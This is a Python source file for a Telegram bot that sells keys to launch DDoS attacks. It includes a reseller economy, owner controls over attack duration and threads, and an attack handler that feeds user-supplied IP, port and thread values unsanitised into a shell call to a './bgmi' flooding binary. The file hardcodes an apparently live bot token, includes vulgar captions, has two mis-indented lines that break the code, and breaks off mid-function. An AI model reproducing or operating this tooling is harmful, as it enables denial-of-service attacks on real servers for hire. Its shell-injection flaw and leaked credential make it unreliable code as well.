import os
import time
import logging
import asyncio
import random
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext, ConversationHandler
from telegram.helpers import escape_markdown

# Suppress HTTP request logs
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("telegram").setLevel(logging.WARNING)

# Logging Configuration
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
)

# Bot Configuration
TELEGRAM_BOT_TOKEN = '7694477480:AAHfV8Ih8LWcf4CwuqsdhRZmPzZZtUXOyaM'
OWNER_USERNAME = "Riyahacksyt"
ALLOWED_GROUP_ID = -1002283210199
MAX_THREADS = 1000
max_duration = 120
bot_open = False
SPECIAL_MAX_DURATION = 200
SPECIAL_MAX_THREADS = 2000

# Key Prices
KEY_PRICES = {
    "1H": 5,
}

# Special Key Prices
SPECIAL_KEY_PRICES = {
    "1D": 70,
}

# Image configuration
START_IMAGES = [
    {
        'url': 'https://www.craiyon.com/image/Mfze8oH8SbO8IDZQZb36Tg',
        'caption': (
            '🔥 *Welcome to the Ultimate DDoS Bot!*\n\n'
            '👑 *Owner:* @Riyahacksyt\n\n'
            '💻 *Example:* `20.235.43.9 14533 120 100`\n\n'
            '💀 *Bsdk threads ha 100 dalo time 120 dalne ke baad* 💀\n\n'
            '🔑 *Need keys? DM @Riyahacksyt to purchase*\n\n'
            '⚠️ *RITIK KI MUMMY KI CHUT BADI MAZBOOT* ⚠️'
        )
    },
]

# File to store key data
KEY_FILE = "keys.txt"

# Key System
keys = {}
special_keys = {}
redeemed_users = {}
redeemed_keys_info = {}
feedback_waiting = {}

# Reseller System
resellers = set()
reseller_balances = {}

# Global Cooldown
global_cooldown = 0
last_attack_time = 0

# Track running attacks
running_attacks = {}

# Keyboards
group_user_keyboard = [
    ['Start', 'Attack'],
    ['Redeem Key', 'Rules'],
    ['🔍 Status']
]
group_user_markup = ReplyKeyboardMarkup(group_user_keyboard, resize_keyboard=True)

reseller_keyboard = [
    ['Start', 'Attack', 'Redeem Key'],
    ['Rules', 'Balance', 'Generate Key'],
    ['🔑 Special Key']
]
reseller_markup = ReplyKeyboardMarkup(reseller_keyboard, resize_keyboard=True)

owner_keyboard = [
    ['Start', 'Attack', 'Redeem Key'],
    ['Rules', 'Set Duration', 'Set Threads'],
    ['Generate Key', 'Keys', 'Delete Key'],
    ['Set Cooldown', 'OpenBot', 'CloseBot'],
    ['🔑 Special Key','RE MENU']
]
owner_markup = ReplyKeyboardMarkup(owner_keyboard, resize_keyboard=True)

re_menu_keyboard = [
    ['Add Reseller', 'Remove Reseller'],
    ['Add Coin', 'Back to Main']
]
re_menu_markup = ReplyKeyboardMarkup(re_menu_keyboard, resize_keyboard=True)

# Conversation States
GET_DURATION = 1
GET_KEY = 2
GET_ATTACK_ARGS = 3
GET_SET_DURATION = 4
GET_SET_THREADS = 5
GET_DELETE_KEY = 6
GET_RESELLER_ID = 7
GET_REMOVE_RESELLER_ID = 8
GET_ADD_COIN_USER_ID = 9
GET_ADD_COIN_AMOUNT = 10
GET_SET_COOLDOWN = 11
GET_SPECIAL_KEY_DURATION = 12
GET_SPECIAL_KEY_FORMAT = 13

def load_keys():
    global keys, special_keys, redeemed_users, redeemed_keys_info
    
    if not os.path.exists(KEY_FILE):
        return

    with open(KEY_FILE, "r") as file:
        for line in file:
            line = line.strip()
            if not line:
                continue
                
            try:
                key_type, key_data = line.split(":", 1)
                if key_type == "ACTIVE_KEY":
                    parts = key_data.split(",")
                    if len(parts) == 2:
                        key, expiration_time = parts
                        keys[key] = {
                            'expiration_time': float(expiration_time),
                            'generated_by': None
                        }
                    elif len(parts) == 3:
                        key, expiration_time, generated_by = parts
                        keys[key] = {
                            'expiration_time': float(expiration_time),
                            'generated_by': int(generated_by)
                        }
                elif key_type == "REDEEMED_KEY":
                    key, generated_by, redeemed_by, expiration_time = key_data.split(",")
                    redeemed_users[int(redeemed_by)] = float(expiration_time)
                    redeemed_keys_info[key] = {
                        'generated_by': int(generated_by),
                        'redeemed_by': int(redeemed_by)
                    }
                elif key_type == "SPECIAL_KEY":
                    key, expiration_time, generated_by = key_data.split(",")
                    special_keys[key] = {
                        'expiration_time': float(expiration_time),
                        'generated_by': int(generated_by)
                    }
                elif key_type == "REDEEMED_SPECIAL_KEY":
                    key, generated_by, redeemed_by, expiration_time = key_data.split(",")
                    redeemed_users[int(redeemed_by)] = {
                        'expiration_time': float(expiration_time),
                        'is_special': True
                    }
                    redeemed_keys_info[key] = {
                        'generated_by': int(generated_by),
                        'redeemed_by': int(redeemed_by),
                        'is_special': True
                    }
            except Exception as e:
                logging.error("Error loading key line: {}. Error: {}".format(line, str(e)))

def save_keys():
    with open(KEY_FILE, "w") as file:
        for key, key_info in keys.items():
            if key_info['expiration_time'] > time.time():
                file.write("ACTIVE_KEY:{},{}{}\n".format(
                    key,
                    key_info['expiration_time'],
                    ",{}".format(key_info['generated_by']) if key_info['generated_by'] is not None else ""
                ))

        for key, key_info in special_keys.items():
            if key_info['expiration_time'] > time.time():
                file.write("SPECIAL_KEY:{},{},{}\n".format(
                    key,
                    key_info['expiration_time'],
                    key_info['generated_by']
                ))

        for key, key_info in redeemed_keys_info.items():
            if key_info['redeemed_by'] in redeemed_users:
                if 'is_special' in key_info and key_info['is_special']:
                    file.write("REDEEMED_SPECIAL_KEY:{},{},{},{}\n".format(
                        key,
                        key_info['generated_by'],
                        key_info['redeemed_by'],
                        redeemed_users[key_info['redeemed_by']]['expiration_time']
                    ))
                else:
                    file.write("REDEEMED_KEY:{},{},{},{}\n".format(
                        key,
                        key_info['generated_by'],
                        key_info['redeemed_by'],
                        redeemed_users[key_info['redeemed_by']]
                    ))

def is_allowed_group(update: Update):
    if not update.effective_chat:
        return False
    chat = update.effective_chat
    return chat.type in ['group', 'supergroup'] and chat.id == ALLOWED_GROUP_ID

def is_owner(update: Update):
    user = update.effective_user
    return user and user.username == OWNER_USERNAME

def is_reseller(update: Update):
    user = update.effective_user
    return user and user.id in resellers

def is_authorized_user(update: Update):
    return is_owner(update) or is_reseller(update)

def get_random_start_image():
    return random.choice(START_IMAGES)

async def open_bot(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ Only the owner can use this command!", parse_mode='Markdown')
        return
    
    global bot_open
    bot_open = True
    await update.message.reply_text(
        "✅ Bot opened! All users can now attack with regular limits:\n"
        "⏳ Max Duration: {} sec\n"
        "🧵 Max Threads: {}\n\n"
        "🔑 Special key features (200 sec) still require a key!\n\n"
        "👑 Owner: @Riyahacksyt".format(max_duration, MAX_THREADS),
        parse_mode='Markdown'
    )

async def close_bot(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ Only the owner can use this command!", parse_mode='Markdown')
        return
    
    global bot_open
    bot_open = False
    await update.message.reply_text(
        "✅ Bot closed! Users now need keys to attack.\n\n"
        "👑 Owner: @Riyahacksyt\n"
        "🔑 DM for keys: @Riyahacksyt",
        parse_mode='Markdown'
    )

async def start(update: Update, context: CallbackContext):
    chat = update.effective_chat
    image = get_random_start_image()
    
    if chat.type == "private":
        if not is_authorized_user(update):
            await update.message.reply_photo(
                photo=image['url'],
                caption=(
                    "❌ This bot is not authorized to use here.\n\n"
                    "👑 Owner: @Riyahacksyt\n"
                    "🔑 DM for keys: @Riyahacksyt"
                ),
                parse_mode='Markdown'
            )
            return

        if is_owner(update):
            await update.message.reply_photo(
                photo=image['url'],
                caption=image['caption'],
                parse_mode='Markdown',
                reply_markup=owner_markup
            )
        else:
            await update.message.reply_photo(
                photo=image['url'],
                caption=image['caption'],
                parse_mode='Markdown',
                reply_markup=reseller_markup
            )
        return

    if not is_allowed_group(update):
        return

    await update.message.reply_photo(
        photo=image['url'],
        caption=image['caption'],
        parse_mode='Markdown',
        reply_markup=group_user_markup
    )

async def generate_key_start(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_reseller(update)):
        await update.message.reply_text(
            "❌ Only the owner or resellers can generate keys!\n\n"
            "👑 Owner: @Riyahacksyt\n"
            "🔑 DM for keys: @Riyahacksyt",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

    await update.message.reply_text(
        "⚠️ Enter the duration for the key (e.g., 1H for 1 hour or 1D for 1 day).\n\n"
        "👑 Owner: @Riyahacksyt",
        parse_mode='Markdown'
    )
    return GET_DURATION

async def generate_key_duration(update: Update, context: CallbackContext):
    duration_str = update.message.text.upper()

    if duration_str not in KEY_PRICES:
        await update.message.reply_text(
            "❌ Invalid format! Use 1H, 1D, or 2D.\n\n"
            "👑 Owner: @Riyahacksyt",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

    user_id = update.effective_user.id
    if is_reseller(update):
        price = KEY_PRICES[duration_str]
        if user_id not in reseller_balances or reseller_balances[user_id] < price:
            await update.message.reply_text(
                "❌ Insufficient balance! You need {} coins to generate this key.\n\n"
                "👑 Owner: @Riyahacksyt\n"
                "💳 DM to recharge balance: @Riyahacksyt".format(price),
                parse_mode='Markdown'
            )
            return ConversationHandler.END

    unique_key = os.urandom(4).hex().upper()
    key = "{}-{}-{}".format(OWNER_USERNAME, duration_str, unique_key)
    keys[key] = {
        'expiration_time': time.time() + (int(duration_str[:-1]) * 3600 if duration_str.endswith('H') else int(duration_str[:-1]) * 86400),
        'generated_by': user_id
    }

    if is_reseller(update):
        reseller_balances[user_id] -= KEY_PRICES[duration_str]

    save_keys()

    await update.message.reply_text(
        "🔑 Generated Key: `{}`\n\n"
        "This key is valid for {}.\n\n"
        "👑 Bot Owner: @Riyahacksyt\n"
        "📩 DM for more keys: @Riyahacksyt".format(key, duration_str),
        parse_mode='Markdown'
    )
    return ConversationHandler.END

async def generate_special_key_start(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_reseller(update)):
        await update.message.reply_text(
            "❌ Only the owner or resellers can generate special keys!\n\n"
            "👑 Owner: @Riyahacksyt\n"
            "🔑 DM for special keys: @Riyahacksyt",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

    await update.message.reply_text(
        "⚠️ Enter the duration for the special key in days (e.g., 7 for 7 days, 30 for 30 days):\n\n"
        "👑 Owner: @Riyahacksyt",
        parse_mode='Markdown'
    )
    return GET_SPECIAL_KEY_DURATION

async def generate_special_key_duration(update: Update, context: CallbackContext):
    try:
        days = int(update.message.text)
        if days <= 0:
            await update.message.reply_text(
                "❌ Duration must be greater than 0!\n\n"
                "👑 Owner: @Riyahacksyt",
                parse_mode='Markdown'
            )
            return ConversationHandler.END
            
        if is_reseller(update):
            user_id = update.effective_user.id
            price = SPECIAL_KEY_PRICES.get("{}D".format(days), 9999)
            if user_id not in reseller_balances or reseller_balances[user_id] < price:
                await update.message.reply_text(
                    "❌ Insufficient balance! You need {} coins to generate this special key.\n\n"
                    "👑 Owner: @Riyahacksyt\n"
                    "💳 DM to recharge balance: @Riyahacksyt".format(price),
                    parse_mode='Markdown'
                )
                return ConversationHandler.END
            
        context.user_data['special_key_days'] = days
        await update.message.reply_text(
            "⚠️ Enter the custom format for the special key (e.g., 'CHUTIYA-TU-HA' will create key 'SPECIAL-CHUTIYA-TU-HA-XXXX'):\n\n"
            "👑 Owner: @Riyahacksyt",
            parse_mode='Markdown'
        )
        return GET_SPECIAL_KEY_FORMAT
    except ValueError:
        await update.message.reply_text(
            "❌ Invalid input! Please enter a number.\n\n"
            "👑 Owner: @Riyahacksyt",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

async def generate_special_key_format(update: Update, context: CallbackContext):
    custom_format = update.message.text.strip().upper()
    days = context.user_data.get('special_key_days', 30)
    
    if is_reseller(update):
        user_id = update.effective_user.id
        price = SPECIAL_KEY_PRICES.get("{}D".format(days), 9999)
        reseller_balances[user_id] -= price
    
    random_suffix = os.urandom(2).hex().upper()
    key = "SPECIAL-{}-{}".format(custom_format, random_suffix)
    expiration_time = time.time() + (days * 86400)
    
    special_keys[key] = {
        'expiration_time': expiration_time,
        'generated_by': update.effective_user.id
    }
    
    save_keys()
    
    await update.message.reply_text(
        "💎 Special Key Generated!\n\n"
        "🔑 Key: `{}`\n"
        "⏳ Duration: {} days\n"
        "⚡ Max Duration: {} sec\n"
        "🧵 Max Threads: {}\n\n"
        "👑 Bot Owner: @Riyahacksyt\n"
        "📩 DM for more special keys: @Riyahacksyt\n\n"
        "⚠️ This key provides enhanced attack capabilities!".format(
            key, days, SPECIAL_MAX_DURATION, SPECIAL_MAX_THREADS
        ),
        parse_mode='Markdown'
    )
    return ConversationHandler.END

async def redeem_key_start(update: Update, context: CallbackContext):
    if not is_allowed_group(update):
        await update.message.reply_text(
            "❌ This command can only be used in the allowed group!\n\n"
            "👑 Owner: @Riyahacksyt",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

    await update.message.reply_text(
        "⚠️ Enter the key to redeem.\n\n"
        "👑 Owner: @Riyahacksyt\n"
        "🔑 DM to purchase keys: @Riyahacksyt",
        parse_mode='Markdown'
    )
    return GET_KEY

async def redeem_key_input(update: Update, context: CallbackContext):
    key = update.message.text.strip()

    if key in keys and keys[key]['expiration_time'] > time.time():
        user_id = update.effective_user.id
        redeemed_users[user_id] = keys[key]['expiration_time']
        redeemed_keys_info[key] = {
            'redeemed_by': user_id,
            'generated_by': keys[key]['generated_by']
        }
        del keys[key]
        
        await update.message.reply_text(
            "✅ Key redeemed successfully! You can now use the attack command for {}.\n\n"
            "👑 Bot Owner: @Riyahacksyt\n"
            "🔑 DM for more keys: @Riyahacksyt".format(key.split('-')[1]),
            parse_mode='Markdown'
        )
    elif key in special_keys and special_keys[key]['expiration_time'] > time.time():
        user_id = update.effective_user.id
        redeemed_users[user_id] = {
            'expiration_time': special_keys[key]['expiration_time'],
            'is_special': True
        }
        redeemed_keys_info[key] = {
            'redeemed_by': user_id,
            'generated_by': special_keys[key]['generated_by'],
            'is_special': True
        }
        del special_keys[key]
        
        await update.message.reply_text(
            "💎 Special Key Redeemed!\n\n"
            "You now have access to enhanced attacks:\n"
            "• Max Duration: {} sec\n"
            "• Max Threads: {}\n\n"
            "👑 Bot Owner: @Riyahacksyt\n"
            "📩 DM for more special keys: @Riyahacksyt\n\n"
            "⚡ Enjoy your enhanced attack capabilities!".format(SPECIAL_MAX_DURATION, SPECIAL_MAX_THREADS),
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text(
            "❌ Invalid or expired key!\n\n"
            "👑 Owner: @Riyahacksyt\n"
            "🔑 DM to purchase valid keys: @Riyahacksyt",
            parse_mode='Markdown'
        )
    
    save_keys()
    return ConversationHandler.END

async def attack_start(update: Update, context: CallbackContext):
    chat = update.effective_chat

    if chat.type == "private":
        if not is_authorized_user(update):
            await update.message.reply_text(
                "❌ This bot is not authorized to use here.\n\n"
                "👑 Owner: @Riyahacksyt",
                parse_mode='Markdown'
            )
            return ConversationHandler.END

   if not is_allowed_group(update):
        await update.message.reply_text(
            "❌ This command can only be used in the allowed group!\n\n"
            "👑 Owner: @Riyahacksyt",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

    global last_attack_time, global_cooldown

    current_time = time.time()
    if current_time - last_attack_time < global_cooldown:
        remaining_cooldown = int(global_cooldown - (current_time - last_attack_time))
        await update.message.reply_text(
            "❌ Please wait! Global cooldown active. Remaining: {} seconds.\n\n"
            "👑 Owner: @Riyahacksyt".format(remaining_cooldown),
            parse_mode='Markdown'
        )
        return ConversationHandler.END

     user_id = update.effective_user.id
    has_special_key = user_id in redeemed_users and (isinstance(redeemed_users[user_id], dict) and redeemed_users[user_id].get('is_special'))
    
    if bot_open or (user_id in redeemed_users):
        await update.message.reply_text(
            "⚠️ Enter the attack arguments: <ip> <port> <duration> <threads>\n\n"
            "ℹ️ Your current limits:\n"
            "⏳ Max Duration: {} sec\n"
            "🧵 Max Threads: {}\n\n"
            "👑 Owner: @Riyahacksyt".format(
                SPECIAL_MAX_DURATION if has_special_key else max_duration,
                SPECIAL_MAX_THREADS if has_special_key else MAX_THREADS
            ),
            parse_mode='Markdown'
        )
        return GET_ATTACK_ARGS
    else:
        await update.message.reply_text(
            "❌ You need a valid key to start an attack!\n\n"
            "👑 Owner: @Riyahacksyt\n"
            "🔑 DM to purchase keys: @Riyahacksyt",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

async def attack_input(update: Update, context: CallbackContext):
    global last_attack_time, running_attacks

    args = update.message.text.split()
    if len(args) != 4:
        await update.message.reply_text(
            "❌ Invalid input! Please enter <ip> <port> <duration> <threads>.\n\n"
            "👑 Owner: @Riyahacksyt",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

    try:
        ip = args[0]
        port = int(args[1])
        duration = int(args[2])
        threads = int(args[3])
    except ValueError:
        await update.message.reply_text(
            "❌ Invalid input! Port, duration and threads must be numbers.\n\n"
            "👑 Owner: @Riyahacksyt",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

    user_id = update.effective_user.id
    is_special = False
    
    if user_id in redeemed_users:
        if isinstance(redeemed_users[user_id], dict) and redeemed_users[user_id].get('is_special'):
            is_special = True
    
    max_allowed_duration = SPECIAL_MAX_DURATION if is_special else max_duration
    max_allowed_threads = SPECIAL_MAX_THREADS if is_special else MAX_THREADS

    if duration > max_allowed_duration:
        await update.message.reply_text(
            "❌ Attack duration exceeds your max limit ({} sec)!\n\n"
            "👑 Owner: @Riyahacksyt".format(max_allowed_duration),
            parse_mode='Markdown'
        )
        return ConversationHandler.END

    if threads > max_allowed_threads:
        await update.message.reply_text(
            "❌ Number of threads exceeds your max limit ({})!\n\n"
            "👑 Owner: @Riyahacksyt".format(max_allowed_threads),
            parse_mode='Markdown'
        )
        return ConversationHandler.END

    last_attack_time = time.time()
    attack_id = "{}:{}-{}".format(ip, port, time.time())
    running_attacks[attack_id] = {
        'user_id': user_id,
        'start_time': time.time(),
        'duration': duration,
        'is_special': is_special
    }

    attack_type = "⚡ SPECIAL ATTACK ⚡" if is_special else "⚔️ Attack Started!"
    
    await update.message.reply_text(
        "{}\n"
        "🎯 Target: {}:{}\n"
        "🕒 Duration: {} sec\n"
        "🧵 Threads: {}\n\n"
        "👑 Bot Owner: @Riyahacksyt\n\n"
        "🔥 Attack is now running!".format(
            attack_type, ip, port, duration, threads
        ),
        parse_mode='Markdown'
    )

    async def run_attack():
        try:
            process = await asyncio.create_subprocess_shell(
                "./bgmi {} {} {} {}".format(ip, port, duration, threads),
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )

            stdout, stderr = await process.communicate()

            if attack_id in running_attacks:
                del running_attacks[attack_id]

            if process.returncode == 0:
                await update.message.reply_text(
                    "✅ Attack Finished!\n"
                    "🎯 Target: {}:{}\n"
                    "🕒 Duration: {} sec\n"
                    "🧵 Threads: {}\n\n"
                    "👑 Bot Owner: @Riyahacksyt\n\n"
                    "🔥 Attack completed successfully!".format(ip, port, duration, threads),
                    parse_mode='Markdown'
                )
            else:
                await update.message.reply_text(
                    "❌ Attack Failed!\n"
                    "🎯 Target: {}:{}\n"
                    "🕒 Duration: {} sec\n"
                    "🧵 Threads: {}\n\n"
                    "👑 Bot Owner: @Riyahacksyt\n\n"
                    "💥 Error: {}".format(
                        ip, port, duration, threads,
                        stderr.decode().strip()
                    ),
                    parse_mode='Markdown'
                )
        except Exception as e:
            logging.error("Error in attack execution: {}".format(str(e)))
            if attack_id in running_attacks:
                del running_attacks[attack_id]
            await update.message.reply_text(
                "❌ Attack Error!\n"
                "🎯 Target: {}:{}\n\n"
                "👑 Bot Owner: @Riyahacksyt\n\n"
                "💥 Error: {}".format(ip, port, str(e)),
                parse_mode='Markdown'
            )

    asyncio.create_task(run_attack())
    return ConversationHandler.END

async def set_cooldown_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text(
            "❌ Only the owner can set cooldown!\n\n"
            "👑 Owner: @Riyahacksyt",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

    await update.message.reply_text(
        "⚠️ Enter the global cooldown duration in seconds.\n\n"
        "👑 Owner: @Riyahacksyt",
        parse_mode='Markdown'
    )
    return GET_SET_COOLDOWN

async def set_cooldown_input(update: Update, context: CallbackContext):
    global global_cooldown

    try:
        global_cooldown = int(update.message.text)
        await update.message.reply_text(
            "✅ Global cooldown set to {} seconds!\n\n"
            "👑 Owner: @Riyahacksyt".format(global_cooldown),
            parse_mode='Markdown'
        )
    except ValueError:
        await update.message.reply_text(
            "❌ Invalid input! Please enter a number.\n\n"
            "👑 Owner: @Riyahacksyt",
            parse_mode='Markdown'
        )
        return ConversationHandler.END
    return ConversationHandler.END

async def show_keys(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_reseller(update)):
        await update.message.reply_text(
            "❌ Only the owner or resellers can view keys!\n\n"
            "👑 Owner: @Riyahacksyt",
            parse_mode='Markdown'
        )
        return

    current_time = time.time()
    active_keys = []
    active_special_keys = []
    redeemed_keys = []
    expired_keys = []

    for key, key_info in keys.items():
        if key_info['expiration_time'] > current_time:
            remaining_time = key_info['expiration_time'] - current_time
            hours = int(remaining_time // 3600)
            minutes = int((remaining_time % 3600) // 60)
            
            generated_by_username = "Unknown"
            if key_info['generated_by']:
                try:
                    chat = await context.bot.get_chat(key_info['generated_by'])
                    generated_by_username = escape_markdown(chat.username or "NoUsername", version=2) if chat.username else "NoUsername"
                except Exception:
                    generated_by_username = "Unknown"
                    
            active_keys.append("🔑 `{}` (Generated by @{}, Expires in {}h {}m)".format(
                escape_markdown(key, version=2),
                generated_by_username,
                hours,
                minutes
            ))
        else:
            expired_keys.append("🔑 `{}` (Expired)".format(escape_markdown(key, version=2)))

    for key, key_info in special_keys.items():
        if key_info['expiration_time'] > current_time:
            remaining_time = key_info['expiration_time'] - current_time
            days = int(remaining_time // 86400)
            hours = int((remaining_time % 86400) // 3600)
            
            generated_by_username = "Unknown"
            if key_info['generated_by']:
                try:
                    chat = await context.bot.get_chat(key_info['generated_by'])
                    generated_by_username = escape_markdown(chat.username or "NoUsername", version=2) if chat.username else "NoUsername"
                except Exception:
                    generated_by_username = "Unknown"
                    
            active_special_keys.append("💎 `{}` (Generated by @{}, Expires in {}d {}h)".format(
                escape_markdown(key, version=2),
                generated_by_username,
                days,
                hours
            ))

    for key, key_info in redeemed_keys_info.items():
        if key_info['redeemed_by'] in redeemed_users:
            redeemed_by_username = "Unknown"
            generated_by_username = "Unknown"
            
            try:
                redeemed_chat = await context.bot.get_chat(key_info['redeemed_by'])
                redeemed_by_username = escape_markdown(redeemed_chat.username or "NoUsername", version=2) if redeemed_chat.username else "NoUsername"
                
                if key_info['generated_by']:
                    generated_chat = await context.bot.get_chat(key_info['generated_by'])
                    generated_by_username = escape_markdown(generated_chat.username or "NoUsername", version=2) if generated_chat.username else "NoUsername"
            except Exception:
                pass
            
            if 'is_special' in key_info and key_info['is_special']:
                redeemed_keys.append("💎 `{}` (Generated by @{}, Redeemed by @{})".format(
                    escape_markdown(key, version=2),
                    generated_by_username,
                    redeemed_by_username
                ))
            else:
                redeemed_keys.append("🔑 `{}` (Generated by @{}, Redeemed by @{})".format(
                    escape_markdown(key, version=2),
                    generated_by_username,
                    redeemed_by_username
                ))

    message = (
        "*🗝️ Active Regular Keys:*\n" +
        ('\n'.join(active_keys) if active_keys else 'No active regular keys found.') +
        "\n\n*💎 Active Special Keys:*\n" +
        ('\n'.join(active_special_keys) if active_special_keys else 'No active special keys found.') +
        "\n\n*🗝️ Redeemed Keys:*\n" +
        ('\n'.join(redeemed_keys) if redeemed_keys else 'No redeemed keys found.') +
        "\n\n*🗝️ Expired Keys:*\n" +
        ('\n'.join(expired_keys) if expired_keys else 'No expired keys found.') +
        "\n\n👑 Owner: @Riyahacksyt\n" +
        "🔑 DM for keys: @Riyahacksyt"
    )

    await update.message.reply_text(message, parse_mode='Markdown')

async def set_duration_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text(
            "❌ Only the owner can set max attack duration!\n\n"
            "👑 Owner: @Riyahacksyt",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

    await update.message.reply_text(
        "⚠️ Enter the maximum attack duration in seconds.\n\n"
        "👑 Owner: @Riyahacksyt",
        parse_mode='Markdown'
    )
    return GET_SET_DURATION

async def set_duration_input(update: Update, context: CallbackContext):
    global max_duration
    try:
        max_duration = int(update.message.text)
        await update.message.reply_text(
            "✅ Maximum attack duration set to {} seconds!\n\n"
            "👑 Owner: @Riyahacksyt".format(max_duration),
            parse_mode='Markdown'
        )
    except ValueError:
        await update.message.reply_text(
            "❌ Invalid input! Please enter a number.\n\n"
            "👑 Owner: @Riyahacksyt",
            parse_mode='Markdown'
        )
        return ConversationHandler.END
    return ConversationHandler.END

async def set_threads_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text(
            "❌ Only the owner can set max threads!\n\n"
            "👑 Owner: @Riyahacksyt",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

    await update.message.reply_text(
        "⚠️ Enter the maximum number of threads.\n\n"
        "👑 Owner: @Riyahacksyt",
        parse_mode='Markdown'
    )
    return GET_SET_THREADS

async def set_threads_input(update: Update, context: CallbackContext):
    global MAX_THREADS
    try:
        MAX_THREADS = int(update.message.text)
        await update.message.reply_text(
            "✅ Maximum threads set to {}!\n\n"
            "👑 Owner: @Riyahacksyt".format(MAX_THREADS),
            parse_mode='Markdown'
        )
    except ValueError:
        await update.message.reply_text(
            "❌ Invalid input! Please enter a number.\n\n"
            "👑 Owner: @Riyahacksyt",
            parse_mode='Markdown'
        )
        return ConversationHandler.END
    return ConversationHandler.END

async def delete_key_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text(
            "❌ Only the owner can delete keys!\n\n"
            "👑 Owner: @Riyahacksyt",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

    await update.message.reply_text(
        "⚠️ Enter the key to delete.\n\n"
        "👑 Owner: @Riyahacksyt",
        parse_mode='Markdown'
    )
    return GET_DELETE_KEY

async def delete_key_input(update: Update, context: CallbackContext):
    key = update.message.text

    if key in keys:
        del keys[key]
        await update.message.reply_text(
            "✅ Key `{}` deleted successfully!\n\n"
            "👑 Owner: @Riyahacksyt".format(key),
            parse_mode='Markdown'
        )
    elif key in special_keys:
        del special_keys[key]
        await update.message.reply_text(
            "✅ Special Key `{}` deleted successfully!\n\n"
            "👑 Owner: @Riyahacksyt".format(key),
            parse_mode='Markdown'
        )
    elif key in redeemed_keys_info:
        user_id = redeemed_keys_info[key]['redeemed_by']
        if isinstance(redeemed_users.get(user_id), dict):
            del redeemed_users[user_id]
        else:
            del redeemed_users[user_id]
        del redeemed_keys_info[key]
        await update.message.reply_text(
            "✅ Redeemed key `{}` deleted successfully!\n\n"
            "👑 Owner: @Riyahacksyt".format(key),
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text(
            "❌ Key not found!\n\n"
            "👑 Owner: @Riyahacksyt",
            parse_mode='Markdown'
        )

    save_keys()
    return ConversationHandler.END

async def add_reseller_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text(
            "❌ Only the owner can add resellers!\n\n"
            "👑 Owner: @Riyahacksyt",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

    await update.message.reply_text(
        "⚠️ Enter the user ID of the reseller.\n\n"
        "👑 Owner: @Riyahacksyt",
        parse_mode='Markdown'
    )
    return GET_RESELLER_ID

async def add_reseller_input(update: Update, context: CallbackContext):
    user_id_str = update.message.text

    try:
        user_id = int(user_id_str)
        resellers.add(user_id)
        reseller_balances[user_id] = 0
        await update.message.reply_text(
            "✅ Reseller with ID {} added successfully!\n\n"
            "👑 Owner: @Riyahacksyt".format(user_id),
            parse_mode='Markdown'
        )
    except ValueError:
        await update.message.reply_text(
            "❌ Invalid user ID! Please enter a valid numeric ID.\n\n"
            "👑 Owner: @Riyahacksyt",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

    return ConversationHandler.END

async def remove_reseller_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text(
            "❌ Only the owner can remove resellers!\n\n"
            "👑 Owner: @Riyahacksyt",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

    await update.message.reply_text(
        "⚠️ Enter the user ID of the reseller to remove.\n\n"
        "👑 Owner: @Riyahacksyt",
        parse_mode='Markdown'
    )
    return GET_REMOVE_RESELLER_ID

async def remove_reseller_input(update: Update, context: CallbackContext):
    user_id_str = update.message.text

    try:
        user_id = int(user_id_str)
        if user_id in resellers:
            resellers.remove(user_id)
            if user_id in reseller_balances:
                del reseller_balances[user_id]
            await update.message.reply_text(
                "✅ Reseller with ID {} removed successfully!\n\n"
                "👑 Owner: @Riyahacksyt".format(user_id),
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_text(
                "❌ Reseller not found!\n\n"
                "👑 Owner: @Riyahacksyt",
                parse_mode='Markdown'
            )
    except ValueError:
        await update.message.reply_text(
            "❌ Invalid user ID! Please enter a valid numeric ID.\n\n"
            "👑 Owner: @Riyahacksyt",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

    return ConversationHandler.END

async def add_coin_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text(
            "❌ Only the owner can add coins!\n\n"
            "👑 Owner: @Riyahacksyt",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

    await update.message.reply_text(
        "⚠️ Enter the user ID of the reseller.\n\n"
        "👑 Owner: @Riyahacksyt",
        parse_mode='Markdown'
    )
    return GET_ADD_COIN_USER_ID

async def add_coin_user_id(update: Update, context: CallbackContext):
    user_id_str = update.message.text

    try:
        user_id = int(user_id_str)
        if user_id in resellers:
            context.user_data['add_coin_user_id'] = user_id
            await update.message.reply_text(
                "⚠️ Enter the amount of coins to add.\n\n"
